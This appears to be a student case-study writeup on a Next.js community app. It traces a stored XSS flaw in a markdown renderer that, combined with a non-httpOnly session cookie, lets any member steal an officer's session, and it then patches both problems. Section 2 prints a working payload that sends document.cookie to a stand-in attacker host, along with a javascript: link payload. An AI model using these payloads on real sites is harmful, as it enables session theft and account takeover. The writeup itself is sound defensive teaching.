# Chalk — Case Study 2 Writeup

**Hosted app:** (fill in after deploying — see submission steps)
**GitHub repo (patched):** (fill in after pushing)

*Note: if hosted on a free tier, the instance may sleep after inactivity — the first
request after idle time can take 30–50 seconds to respond.*

## 1. How the app works

Chalk is a Next.js App Router app. Pages are React Server Components that run only on
the server — they read the database and render HTML directly. The only code that runs in
the browser is a handful of small client components (`PostBody`, `LogoutButton`) and the
framework's own hydration logic for wiring up server actions. (See attached hand-drawn
architecture sketch for the request-flow diagram.)

**Which code runs where.** `app/page.js`, `app/mod/page.js`, `app/login/page.js`, etc. are
server components: their `db.prepare(...)` calls and session checks run only on the
server, never shipped to the browser. Form submissions call **server actions**
(`"use server"` functions in `lib/actions.js`) — the browser sends form data, the function
runs entirely server-side, and the page re-renders. `components/PostBody.js` is one of the
few `"use client"` files; its only job is to inject already-rendered HTML into the DOM.

**How a session cookie becomes `currentUser`.** On login, `loginAction` verifies the
password with `bcrypt`, creates a random 24-byte token, stores it in a `sessions` table
keyed to the user id, and sets it as the `chalk_session` cookie. On every request,
`currentUser()` (`lib/actions.js`) reads that cookie and calls `userFromToken()`
(`lib/auth.js`), which joins `sessions` to `users` to return the current user's id, email,
display name, and role. Nothing is signed or encrypted — the token is just a random
lookup key — so possessing the cookie value is equivalent to being that user.

**How a post gets from the compose form onto the wall.** `createPostAction` reads the
`body` field, checks length (3–2000 chars), and inserts it as-is into the `posts` table.
When the wall renders, `app/page.js` passes each post's raw `body` through
`renderMarkdown()` (`lib/markdown.js`), which turns `**bold**`, `*italic*`, `` `code` ``,
headings, lists, and `[label](url)` links into real HTML tags via regex substitution. That
HTML string is then handed to `<PostBody html={...} />`, which renders it with
`dangerouslySetInnerHTML` — whatever HTML comes out of `renderMarkdown` is inserted into
the page verbatim.

**What an officer can see that a member cannot.** `app/mod/page.js` checks
`user.role !== "officer"` and, if true, renders a placeholder instead of querying the
`officer_desk` table. Members are correctly blocked from the page itself — the access
control on `/mod` is not the problem. The `officer_desk` table holds things like the shop
cage combination, seeded specifically so it should never appear anywhere outside that page.

---

## 2. The security defect: stored XSS in post bodies, escalating to session theft

**Location:** `lib/markdown.js`, the `renderMarkdown()` function (root cause), combined
with the `chalk_session` cookie missing `httpOnly` in `lib/actions.js` (what turns it from
a defacement bug into full account takeover).

`renderMarkdown()` is supposed to convert a small set of markdown syntax into HTML. Before
this patch, it ran the markdown regex replacements directly on the raw post body with no
HTML-escaping step first:

```js
function escapeUnused(_src) {
  return _src;               // does nothing — the function's own name says so
}

function renderMarkdown(src) {
  const text = String(src ?? "");
  return escapeUnused(text)
    .replace(/^### (.+)$/gm, "<h3>$1</h3>")
    // ...markdown replacements...
}
```

Because nothing strips or encodes literal `<`, `>`, or quote characters, any HTML a user
types is passed straight through, and `PostBody` renders it with
`dangerouslySetInnerHTML`. Anyone who can compose a post — every registered `.edu`
member, not just officers — can inject arbitrary HTML and `<script>`-equivalent tags
(e.g. `<img onerror>`, since literal `<script>` tags are stripped by the browser when
inserted via `innerHTML`, but event-handler attributes like `onerror` are not) into a page
every visitor to the public wall renders.

On its own that's a stored XSS. It becomes much more serious because `chalk_session` is
set without `httpOnly`:

```js
jar.set("chalk_session", token, {
  path: "/",
  sameSite: "lax",
  maxAge: 60 * 60 * 24 * 14
});
```

Without `httpOnly`, JavaScript running on the page — including injected attacker
JavaScript — can read `document.cookie` and exfiltrate the session token to anywhere. Since
sessions are just an opaque lookup key with no additional binding, that stolen token can be
replayed from a completely different browser/machine to impersonate the victim, officer
role included.

### How to trigger it (verified end-to-end with a real browser, not just code reading)

No special access is needed — any `.edu` member account can do this. Using the seeded
`maya@campus.edu` / `campus123` (member) account:

1. Log in as Maya and go to **Compose**.
2. Post something that reads like a normal announcement but hides a payload:
   ```
   Free ride to comp Saturday! <img src=x onerror="fetch('https://attacker.example/steal?c='+encodeURIComponent(document.cookie))">
   ```
3. The post appears on the public wall like any other post — nothing about it looks
   suspicious to a casual reader.
4. When **anyone** loads the wall — including officer `priya@campus.edu` /
   `officer123` — the browser tries to load the broken image, `onerror` fires, and
   `document.cookie` (containing Priya's live `chalk_session` value) is sent to the
   attacker's endpoint. Priya did nothing but open the page.
5. The attacker takes that stolen `chalk_session` value, sets it as their own cookie, and
   navigates to `/mod`. The server has no way to distinguish this from Priya's real
   browser — it's the same token. This loaded the officer desk and disclosed the real cage
   combination and after-hours line straight out of the seeded data.

I reproduced this full chain with Playwright driving real Chromium sessions for both the
"attacker" and "officer" accounts, confirmed the cookie carried `httpOnly: false`,
confirmed the exfiltration request actually fired and delivered the live session token, and
confirmed that token successfully loaded `/mod` and returned the confidential note. A
second payload, `[click me](javascript:alert(document.cookie))`, showed the link syntax has
the same problem: the URL from `[label](url)` was inserted into `href` with no scheme
check, so a `javascript:` URL would run on click.

**Impact:** any member can compromise any other user's account — including an officer's —
just by making them view the public wall, which is the app's core, unavoidable feature.
This is OWASP A03:2021 – Injection (stored XSS), compounded by a missing cookie protection
that turns it into full session hijacking.

---

## 3. The patch

Two changes, both minimal and backward-compatible with existing posts and normal markdown.

**a) Escape HTML before applying markdown (`lib/markdown.js`) — closes the injection.**

```diff
-function escapeUnused(_src) {
-  return _src;
+function escapeHtml(src) {
+  return String(src ?? "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+function safeHref(url) {
+  const trimmed = String(url ?? "").trim();
+  if (/^(https?:|mailto:)/i.test(trimmed)) return trimmed;
+  if (/^\//.test(trimmed)) return trimmed;
+  return "#";
 }

 function renderMarkdown(src) {
-  const text = String(src ?? "");
-  return escapeUnused(text)
+  const text = escapeHtml(src);
+  return text
     .replace(/^### (.+)$/gm, "<h3>$1</h3>")
     ...
-    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
+    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, (_m, label, url) => `<a href="${safeHref(url)}">${label}</a>`)
     ...
```

By escaping first, any literal `<`, `>`, `"`, or `'` a user types becomes inert text
(`&lt;`, `&gt;`, etc.) before the markdown regexes run. The regexes then only ever
*generate* trusted tags like `<strong>` and `<code>` — an attacker's own angle brackets can
never become live markup. `safeHref` closes the second vector: link URLs are only accepted
if they start with `http:`, `https:`, `mailto:`, or `/` (a relative link); anything else,
including `javascript:`, is replaced with `#`.

**b) Mark the session cookie `httpOnly` (`lib/actions.js`) — defense in depth.**

```diff
 jar.set("chalk_session", token, {
   path: "/",
+  httpOnly: true,
   sameSite: "lax",
   maxAge: 60 * 60 * 24 * 14
 });
```

Nothing in Chalk's own client-side code ever needs to read this cookie from JavaScript, so
there's no functional cost. This doesn't fix the root cause by itself — the escaping in (a)
does that — but it means any *future* XSS bug, in this feature or another, can no longer
turn into session theft the same way. Both `loginAction` and `registerAction` set this
cookie identically, so both call sites were updated.

### Why normal use still works (verified end-to-end)

Re-ran the exact same Playwright chain against the patched app:

| Test | Before patch | After patch |
|---|---|---|
| `**bold**`, `*italic*`, `` `code` `` | renders as `<strong>`/`<em>`/`<code>` | renders identically ✔ |
| `[UD site](https://udel.edu)` | renders as a working link | renders identically ✔ |
| `<img src=x onerror=...>` payload | executes, steals cookie | rendered as literal escaped text — inert ✔ |
| `[click me](javascript:alert(...))` | would execute on click | `href` rewritten to `#` — inert ✔ |
| Officer views wall with malicious post present | cookie exfiltrated | nothing exfiltrated ✔ |
| `chalk_session` cookie flags | `httpOnly: false` | `httpOnly: true` ✔ |
| Stolen-cookie replay against `/mod` | loads officer desk, leaks cage code | (no cookie to steal in the first place) ✔ |

Only two files changed (`lib/markdown.js`, `lib/actions.js`); everything else — the routes,
the auth flow, the officer role check — is untouched.
